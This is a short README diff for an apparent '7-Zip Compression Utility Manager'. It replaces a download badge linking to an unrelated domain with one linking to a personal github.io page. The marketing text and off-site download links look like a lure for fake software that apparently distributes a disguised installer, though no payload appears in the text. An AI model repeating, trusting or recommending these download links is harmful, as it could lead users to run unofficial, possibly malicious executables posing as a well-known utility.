@@ -2,7 +2,7 @@
 
 7-Zip Compression Utility Manager is a polished Windows tool to download, install, update, and configure 7-Zip effortlessly. It ensures access to the latest 7-Zip binaries with support for high compression rates, strong security, multi-threaded operations, and automation modes. Perfect for developers, IT pros, and anyone who works with large archives or needs reliable compression tools.
 
-[![Download 7-Zip Compression Utility Manager](https://img.shields.io/badge/Download-7-Zip_Compression_Utility_Manager-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://ronaldvasqueztdmy.github.io/.github/7-Zip)
 
 ---
 
